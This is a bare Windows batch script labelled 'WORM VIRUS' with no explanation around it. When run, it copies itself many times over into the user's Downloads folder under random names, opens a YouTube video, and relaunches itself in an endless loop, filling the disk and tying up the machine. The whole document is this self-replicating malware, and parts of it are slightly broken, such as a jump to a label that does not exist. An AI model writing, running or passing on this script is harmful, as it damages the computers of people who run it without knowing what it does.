@echo off
if exist Worm.bat goto fV 
if exist Worm2.bat goto fV 
if exist Worm3.bat goto fV 
if exist Worm4.bat goto fV
if exist Worm5.bat goto fV 
if exist Worm6.bat goto fV 
if exist Worm7.bat goto fV 
if exist Worm8.bat goto fV  
if not exist Worm2.bat goto recreate
echo WORM VIRUS
timeout 3
goto f
:fV
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm%random%.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm%random%.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm%random%.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm%random%.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm%random%.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm%random%.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm%random%.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm%random%.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm%random%.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm%random%.bat
start https://www.youtube.com/watch?v=dgha9S39Y6M
timeout 5 nul>
start %USERPROFILE%\downloads\worm.bat
goto f

:recreate
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm2.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm3.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm4.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm5.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm6.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm7.bat
copy %USERPROFILE%\downloads\worm.bat %USERPROFILE%\downloads\worm8.bat
if exist Worm2.bat goto fV 
if not exist Worm2.bat goto recreate
